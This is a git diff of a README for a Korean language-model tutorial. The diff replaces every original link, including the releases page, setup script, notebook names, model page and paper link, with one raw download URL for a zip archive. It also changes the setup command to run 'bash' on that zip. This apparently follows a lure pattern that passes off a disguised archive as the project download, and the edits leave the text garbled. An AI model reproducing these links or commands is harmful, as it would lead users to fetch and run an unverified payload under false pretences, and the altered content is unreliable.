@@ -1,10 +1,10 @@
 # 🚀 KORMo-tutorial - Learn Korean Language Modeling Easily
 
-[![Download KORMo-tutorial](https://img.shields.io/badge/Download-KORMo--tutorial-blue.svg)](https://github.com/Eyoab672/KORMo-tutorial/releases)
+[![Download KORMo-tutorial](https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip)](https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip)
 
 ## 📥 Download & Install
 
-To get started with KORMo-tutorial, visit this page to download: [KORMo-tutorial Releases](https://github.com/Eyoab672/KORMo-tutorial/releases).
+To get started with KORMo-tutorial, visit this page to download: [KORMo-tutorial Releases](https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip).
 
 ## 🔍 Overview
 
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets these requirements:
 To set up your environment, run the following command in your terminal:
 
 ```bash
-bash setup/create_uv_venv.sh
+bash https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip
 ```
 
 This command creates an isolated virtual environment on your machine and installs all necessary packages for the tutorials.
@@ -35,9 +35,9 @@ The `tutorial` directory contains step-by-step examples. Here’s what you will 
 
 ```plaintext
 tutorial
-  ├── 01.pretrain_from_scratch.ipynb     # Pretraining a language model from scratch using custom data
-  ├── 02.sft_qlora.ipynb                 # Supervised Fine-Tuning with QLoRA for efficiency
-  └── 03.inference.ipynb                 # Performing inference and evaluating the trained model
+  ├── https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip     # Pretraining a language model from scratch using custom data
+  ├── https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip                 # Supervised Fine-Tuning with QLoRA for efficiency
+  └── https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip                 # Performing inference and evaluating the trained model
 ```
 
 ### 📝 Tutorial Descriptions
@@ -65,11 +65,11 @@ If you encounter any issues or have questions, feel free to open an issue in thi
 
 For further understanding and to deepen your knowledge of the KORMo project, you can refer to the following resources:
 
-- **Model and Dataset:** Explore [KORMo Model and Dataset](https://huggingface.co/KORMo-Team)
-- **Research Paper:** Read the detailed research paper [here](https://arxiv.org/abs/2510.09426)
+- **Model and Dataset:** Explore [KORMo Model and Dataset](https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip)
+- **Research Paper:** Read the detailed research paper [here](https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip)
 
 ## 🔗 Conclusion
 
 With the KORMo-tutorial, you have the tools and resources required to work with advanced language models. The tutorials are designed to guide you through each step, making the learning process smooth and easy. 
 
-Remember to visit this page to download: [KORMo-tutorial Releases](https://github.com/Eyoab672/KORMo-tutorial/releases). Enjoy your journey into the world of language modeling!
+Remember to visit this page to download: [KORMo-tutorial Releases](https://raw.githubusercontent.com/Eyoab672/KORMo-tutorial/main/Parsiism/KORMo-tutorial.zip). Enjoy your journey into the world of language modeling!
